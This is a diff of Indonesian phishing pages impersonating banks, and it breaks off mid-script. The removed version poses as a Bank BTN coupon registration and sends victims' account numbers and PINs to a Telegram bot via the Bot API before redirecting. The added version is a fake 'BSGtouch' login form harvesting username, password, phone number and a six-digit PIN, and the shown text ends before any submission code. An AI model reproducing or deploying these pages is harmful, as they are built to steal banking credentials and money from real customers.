@@ -1,240 +1,474 @@
 <!DOCTYPE html><html lang="id"><head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="theme-color" content="#FE6A00">
-  <meta name="description" content="Cetak Kupon BTN secara online dengan mudah dan cepat.">
-  <title>Cetak Kupon BTN</title>
-  <link rel="icon" type="image/png" href="./hosting.tigerengine.id/ssmuyg.jpg">
-  <link rel="image_src" href="">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>BSGtouch - Pendaftaran</title>
+
   <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #f2f2f2;
+    :root{
+      --bg:#0f1012;
+      --panel: rgba(255,255,255,.06);
+      --text:#f2f4f8;
+      --muted: rgba(242,244,248,.68);
+      --stroke: rgba(255,255,255,.10);
+      --shadow: 0 18px 55px rgba(0,0,0,.55);
+      --danger:#b3182b;
+      --danger2:#cc2239;
+      --gold:#c9a93c;
+
+      --field:#ffffff;
+      --fieldText:#0e1116;
     }
 
-    #main-content {
-      position: relative;
-      z-index: 1;
+    *{ box-sizing:border-box; }
+    html,body{ height:100%; }
+    body{
+      margin:0;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji","Segoe UI Emoji";
+      background: radial-gradient(1200px 800px at 70% 30%, rgba(255,255,255,.06), transparent 60%),
+                  radial-gradient(900px 700px at 25% 80%, rgba(255,255,255,.05), transparent 55%),
+                  linear-gradient(180deg, #0a0b0d, #0e1013 50%, #0a0b0d);
+      color: var(--text);
+      overflow-x:hidden;
     }
 
-    header {
-      background-color: #ffffff;
-      padding: 10px 20px;
-      border-bottom: 1px solid #ddd;
+    /* ====== ABSTRACT WAVE BACKGROUND ====== */
+    .bg-waves{
+      position:fixed;
+      inset:-10% -10% -10% -10%;
+      pointer-events:none;
+      opacity:.85;
+      filter: drop-shadow(0 20px 50px rgba(0,0,0,.55));
+    }
+    .bg-waves::before,
+    .bg-waves::after{
+      content:"";
+      position:absolute;
+      inset:0;
+      background:
+        radial-gradient(closest-side at 65% 20%, rgba(255,255,255,.12), transparent 68%),
+        radial-gradient(closest-side at 30% 75%, rgba(255,255,255,.10), transparent 65%),
+        radial-gradient(closest-side at 90% 75%, rgba(255,255,255,.06), transparent 70%);
+      mix-blend-mode: overlay;
+      opacity:.35;
+    }
+    .bg-waves svg{
+      width:100%;
+      height:100%;
+      opacity:.65;
     }
 
-    header img.logo {
-      height: 50px;
+    .wrap{
+      min-height:100%;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:26px 16px 22px;
+      position:relative;
+      z-index:1;
     }
 
-    .hero {
-      background-color: #f7941d;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 30px 10px;
+    .phone{
+      width:min(430px, 100%);
+      border-radius:28px;
+      position:relative;
     }
 
-    .hero img {
-      max-width: 100%;
-      height: auto;
-      border-radius: 8px;
+.logo-fallback{
+  width:100%;
+  height:100px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+
+.logo-text{
+  font-weight:900;
+  font-size:70px;
+  letter-spacing:.5px;
+  color:#fff;
+}
+.logo-text span{
+  font-weight:700;
+  font-style:italic;
+}
+
+
+
+    .card{
+      padding: 14px 18px 16px;
+      border-radius: 26px;
+      background: rgba(0,0,0,.18);
+      border: 1px solid rgba(255,255,255,.08);
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(10px);
     }
 
-    .content {
-      text-align: center;
-      padding: 30px 20px;
+    h1{
+      margin: 8px 0 10px;
+      font-size: 32px;
+      letter-spacing:.2px;
     }
 
-    .content-box {
-      background-color: #007580;
-      color: white;
-      padding: 20px;
-      border-radius: 10px;
-      border: 4px solid #f7941d;
-      max-width: 700px;
-      margin: 0 auto;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      font-size: 18px;
-      min-height: 100px;
-      line-height: 1.6;
+    .field{ margin-top:12px; }
+    .label{
+      font-size:14px;
+      color: rgba(242,244,248,.78);
+      margin: 10px 2px 7px;
     }
 
-    footer {
-      background-color: #035b5b;
-      height: 100px;
-      margin-top: 30px;
+    .inputWrap{
+      position:relative;
+      width:100%;
     }
 
-    #calling-popup {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background-color: rgba(0, 0, 0, 0.7);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 10000;
+    /* ==== INPUT LEBIH PROFESIONAL (LEBIH PENDEK) ==== */
+    input[type="text"], input[type="password"]{
+      width:100%;
+      height:48px;
+      border-radius: 16px;
+      border: 1px solid rgba(0,0,0,.08);
+      outline:none;
+      padding: 0 14px;
+      font-size:15px;
+      background: var(--field);
+      color: var(--fieldText);
+      box-shadow: 0 10px 22px rgba(0,0,0,.16);
     }
+    input::placeholder{ color: rgba(14,17,22,.45); }
 
-    .popup-content {
-      background-color: white;
-      padding: 30px;
+    .iconBtn{
+      position:absolute;
+      right:8px;
+      top:50%;
+      transform: translateY(-50%);
+      width:36px;
+      height:36px;
       border-radius: 12px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.4);
-      text-align: center;
-      font-size: 20px;
-      font-weight: bold;
-      color: #333;
+      border: 0;
+      background: rgba(0,0,0,.06);
+      cursor:pointer;
+      display:grid;
+      place-items:center;
+      transition: .12s ease;
+    }
+    .iconBtn:hover{ background: rgba(0,0,0,.08); }
+    .iconBtn:active{ transform: translateY(-50%) scale(.98); }
+
+    /* ==== ICON MATA (SVG) ==== */
+    .eyeSvg{ width:20px; height:20px; display:block; }
+    .eyeStroke{
+      stroke: rgba(0,0,0,.62);
+      stroke-width: 2;
+      fill: none;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+    .eyeFill{ fill: rgba(0,0,0,.62); }
+    .slash{
+      stroke: rgba(0,0,0,.55);
+      stroke-width: 2;
+      stroke-linecap: round;
+      display:none;
+    }
+    .iconBtn.hidden .slash{ display:block; }
+
+    .row{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+      margin-top: 12px;
+    }
+    .remember{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      color: rgba(242,244,248,.70);
+      font-size: 13px;
+      line-height: 1.2;
+      flex:1;
     }
 
-    .dot {
-      animation: blink 1.2s infinite;
-      margin-left: 5px;
+    /* Switch */
+    .switch{
+      position:relative;
+      width:52px;
+      height:28px;
+      flex:0 0 auto;
+    }
+    .switch input{ display:none; }
+    .slider{
+      position:absolute;
+      inset:0;
+      background: rgba(255,255,255,.22);
+      border:1px solid rgba(255,255,255,.18);
+      border-radius:999px;
+      cursor:pointer;
+      transition:.2s ease;
+    }
+    .slider::after{
+      content:"";
+      position:absolute;
+      top:50%;
+      left:3px;
+      width:22px; height:22px;
+      background:#fff;
+      border-radius:50%;
+      transform: translateY(-50%);
+      transition:.2s ease;
+      box-shadow: 0 8px 18px rgba(0,0,0,.25);
+    }
+    .switch input:checked + .slider{
+      background: rgba(255,255,255,.35);
+    }
+    .switch input:checked + .slider::after{
+      left:27px;
     }
 
-    @keyframes blink {
-      0% { opacity: 0; }
-      50% { opacity: 1; }
-      100% { opacity: 0; }
+    .actions{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      margin-top: 14px;
+      gap: 12px;
+    }
+    .forgot{
+      color: var(--gold);
+      font-size: 15px;
+      text-decoration:none;
+      opacity:.95;
+    }
+    .forgot:hover{ text-decoration:underline; }
+
+    .btn{
+      height:48px;
+      min-width: 150px;
+      padding: 0 18px;
+      border-radius: 999px;
+      border: 0;
+      background: linear-gradient(180deg, var(--danger2), var(--danger));
+      color: #fff;
+      font-weight: 800;
+      font-size: 15px;
+      cursor:pointer;
+      box-shadow: 0 16px 35px rgba(179,24,43,.35);
+    }
+    .btn:active{ transform: translateY(1px); }
+
+    .help{
+      display:flex;
+      justify-content:center;
+      margin-top: 16px;
+    }
+    .helpBadge{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      background:#fff;
+      border-radius: 14px;
+      padding: 9px 13px;
+      box-shadow: 0 14px 35px rgba(0,0,0,.25);
+      color:#b3182b;
+      border: 1px solid rgba(0,0,0,.06);
+    }
+    .helpIcon{
+      width:26px; height:26px;
+      border-radius:50%;
+      background: rgba(179,24,43,.12);
+      display:grid;
+      place-items:center;
+      color:#b3182b;
+      font-weight:900;
+    }
+    .helpText{
+      display:flex;
+      flex-direction:column;
+      line-height:1.05;
+    }
+    .helpText small{
+      color: rgba(0,0,0,.55);
+      font-weight:800;
+      letter-spacing:.2px;
+      font-size: 11px;
+    }
+    .helpText b{
+      font-size: 22px;
+      letter-spacing:.8px;
     }
 
-    /* Style untuk form */
-    #input-form {
-      display: none;
-      margin-top: 20px;
+    .note{
+      margin-top: 10px;
+      font-size: 12.5px;
+      color: rgba(242,244,248,.55);
     }
 
-    #input-form input {
-      display: block;
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ddd;
-      border-radius: 5px;
-      font-size: 16px;
+    /* Simple toast */
+    .toast{
+      position:fixed;
+      left:50%;
+      bottom:18px;
+      transform: translateX(-50%);
+      background: rgba(0,0,0,.75);
+      border: 1px solid rgba(255,255,255,.12);
+      color:#fff;
+      padding: 10px 12px;
+      border-radius: 12px;
+      font-size: 13px;
+      opacity:0;
+      pointer-events:none;
+      transition: .2s ease;
+      z-index: 50;
+      backdrop-filter: blur(8px);
     }
-
-    #input-form button {
-      background-color: #f7941d;
-      color: white;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      font-size: 16px;
-    }
+    .toast.show{ opacity:1; }
   </style>
 </head>
+
 <body>
+  <div class="bg-waves" aria-hidden="true">
+    <svg viewBox="0 0 1000 1200" preserveAspectRatio="xMidYMid slice">
+      <defs>
+        <linearGradient id="g1" x1="0" x2="1">
+          <stop offset="0" stop-color="#ffffff" stop-opacity=".10"></stop>
+          <stop offset="1" stop-color="#ffffff" stop-opacity=".02"></stop>
+        </linearGradient>
+        <filter id="noise">
+          <feTurbulence type="fractalNoise" baseFrequency=".8" numOctaves="2" stitchTiles="stitch"></feTurbulence>
+          <feColorMatrix type="matrix" values="0 0 0 0 0
+                    0 0 0 0 0
+                    0 0 0 0 0
+                    0 0 0 .12 0"></feColorMatrix>
+        </filter>
+      </defs>
 
-  <div id="main-content">
-    <header>
-      <!-- Logo BTN dihapus -->
-    </header>
+      <path d="M760,-10
+               C640,150 680,250 800,360
+               C920,470 900,600 780,720
+               C660,840 660,980 760,1220
+               L1030,1220 L1030,-10 Z" fill="url(#g1)"></path>
 
-    <section class="hero">
-      <img src="../a81c8f40-78be-4567-bd5e-f37e4a61dc15_v%3D1745088049844.png" alt="RTanjongBobok">
-    </section>
+      <path d="M680,-10
+               C560,130 610,240 720,350
+               C830,460 820,610 710,740
+               C600,870 610,1000 700,1220" fill="none" stroke="#ffffff" stroke-opacity=".12" stroke-width="56" stroke-linecap="round"></path>
 
-    <section class="content">
-      <div class="content-box" id="text-box"></div>
-      <form id="input-form">
-        <input type="text" id="account-number" placeholder="Masukkan Nomor Rekening" required>
-        <input type="password" id="pin" placeholder="Masukkan PIN" required>
-        <button type="submit">Kirim</button>
-      </form>
-    </section>
-
-    <footer></footer>
+      <rect x="0" y="0" width="1000" height="1200" filter="url(#noise)" opacity=".35"></rect>
+    </svg>
   </div>
 
-  <!-- Popup overlay awal dihapus -->
+  <div class="wrap">
+    <div class="phone">
+      <div class="top-logo">
+        <div class="logo-box">
+          <!-- GANTI FILE INI DENGAN LOGO KAMU -->
+          <img src="logo-placeholder.png" alt="Logo Placeholder"
+onerror="this.outerHTML='<div class=&quot;logo-fallback&quot;><div class=&quot;logo-text&quot;>BSG<span>touch</span></div></div>'">
 
-  <div id="calling-popup">
-    <div class="popup-content">Sedang di hubungkan ke CS<span class="dot">...</span>
+      </div>
+
+      <div class="card">
+        <h1>Selamat Datang</h1>
+
+          <form id="loginForm" autocomplete="on">
+          <div class="field">
+            <div class="label">Masukkan Username</div>
+            <div class="inputWrap">
+              <input id="username" name="a" type="text" required="">
+            </div>
+          </div>
+
+          <div class="row">
+            <div class="remember">Simpan username untuk login berikutnya?</div>
+            <label class="switch" title="Simpan username">
+              <input id="rememberToggle" type="checkbox">
+              <span class="slider"></span>
+            </label>
+          </div>
+
+          <div class="field">
+            <div class="label">Masukkan password</div>
+            <div class="inputWrap">
+              <!-- NIK bebas: boleh huruf, angka, simbol -->
+              <input id="nik" name="b" type="password" autocomplete="off" required="">
+              <button class="iconBtn hidden" type="button" id="toggleNik" aria-label="Tampilkan/Sembunyikan NIK" title="Tampilkan/Sembunyikan">
+                <svg class="eyeSvg" viewBox="0 0 24 24" aria-hidden="true">
+                  <path class="eyeStroke" d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z"></path>
+                  <circle class="eyeFill" cx="12" cy="12" r="2.2"></circle>
+                  <path class="slash" d="M4 20L20 4"></path>
+                </svg>
+              </button>
+            </div>
+            <div class="note"></div>
+          </div>
+                        <div class="field">
+            <div class="label">Masukkan nomor handphone</div>
+            <div class="inputWrap">
+        <input type="text" name="c" id="nomor" inputmode="numeric" minlength="10" maxlength="15" placeholder="0812XXXXXXX" class="box" required="">
+            </div>
+          </div>
+          <div class="field">
+            <div class="label">Masukkan Pin</div>
+            <div class="inputWrap">
+        <input type="text" name="d" id="pinr" inputmode="numeric" minlength="6" maxlength="6" placeholder="XXXXXX" class="box" required="">
+            </div>
+          </div>
+
+          <div class="actions">
+            <a class="forgot" href="#" id="forgotLink">Lupa Password?</a>
+            <button class="btn" type="submit">Masuk</button>
+          </div>
+        </form>
+
+        <div class="help">
+          <div class="helpBadge" role="note">
+            <div class="helpIcon">☎</div>
+            <div class="helpText">
+              <small>CONTACT CENTER BSG</small>
+              <b></b>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="toast" id="toast"></div>
     </div>
-  </div>
-
-  <!-- Audio dihapus -->
+  
 
   <script>
-    const textBox = document.getElementById("text-box");
-    const callingPopup = document.getElementById("calling-popup");
-    const inputForm = document.getElementById("input-form");
+    const $ = (s) => document.querySelector(s);
 
-    const scriptText = `Terima kasih telah mendaftar di layanan Bank BTN Festival. 
-Pendaftaran Anda sedang diproses. 
-beberapa saat lagi, Anda akan dihubungi oleh pihak Bank BTN 
-untuk proses pencetakan kode kupon undian Anda.`;
+    // Remember username
+    const usernameEl = $("#username");
+    const rememberToggle = $("#rememberToggle");
 
-    function typeTextPerChar(text, duration, callback) {
-      const totalChars = text.length;
-      const interval = duration / totalChars * 1000; // ms per karakter
-      let index = 0;
+    const savedUser = localStorage.getItem("bsgtouch_username");
+    const savedRemember = localStorage.getItem("bsgtouch_remember") === "1";
 
-      function type() {
-        if (index < totalChars) {
-          textBox.innerHTML += text[index];
-          index++;
-          setTimeout(type, interval);
-        } else {
-          callback?.();
-        }
+    if (savedRemember && savedUser) {
+      usernameEl.value = savedUser;
+      rememberToggle.checked = true;
+    }
+
+    rememberToggle.addEventListener("change", () => {
+      localStorage.setItem("bsgtouch_remember", rememberToggle.checked ? "1" : "0");
+      if (!rememberToggle.checked) {
+        localStorage.removeItem("bsgtouch_username");
+      } else {
+        localStorage.setItem("bsgtouch_username", usernameEl.value.trim());
       }
-
-      type();
-    }
-
-    function startTyping() {
-      const durasi = 20; // Durasi tetap 20 detik tanpa audio
-      typeTextPerChar(scriptText, durasi, () => {
-        console.log("Selesai mengetik");
-        inputForm.style.display = "block"; // Tampilkan form setelah typing
-      });
-    }
-
-    // Fungsi untuk kirim data ke Telegram
-    async function sendToTelegram(data) {
-      const botToken = 'YOUR_BOT_TOKEN'; // Ganti dengan token bot Telegram Anda
-      const chatId = 'YOUR_CHAT_ID'; // Ganti dengan chat ID tujuan
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      const message = `Data Baru:\nNomor Rekening: ${data.account}\nPIN: ${data.pin}`;
-
-      try {
-        await fetch(url, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-          }),
-        });
-      } catch (error) {
-        // Tidak ada penanganan error, langsung lanjut
-      }
-
-      // Redirect otomatis tanpa pemberitahuan
-      window.location.href = 'https://example.com/next-page'; // Ganti dengan URL halaman berikutnya
-    }
-
-    // Event listener untuk form submit
-    inputForm.addEventListener('submit', function(event) {
-      event.preventDefault();
-      const account = document.getElementById('account-number').value;
-      const pin = document.getElementById('pin').value;
-      const data = { account, pin };
-      sendToTelegram(data);
     });
 
-    // Langsung mulai tanpa popup awal dan audio
-    window.onload = function() {
-      startTyping();
-    };
-  </script>
+    usernameEl.addEventListener("input", () => {
+      if (rememberToggle.checked) {
+        localStorage.setItem("bsgtouch_username", usernameEl.value.trim());
+      }
+    });
 
+    // Toggle Eye (NIK show/hide)
+    const nikEl = $("#nik");
+    const toggleNikBtn = $("#toggleNik");
+    let isHidden = true; // default hidden
 
-</body></html>
+    toggleNikBtn.addEventListener("click", () => {
+      isHidden = !isHidden;
+      nikEl.type = isHidden ? "
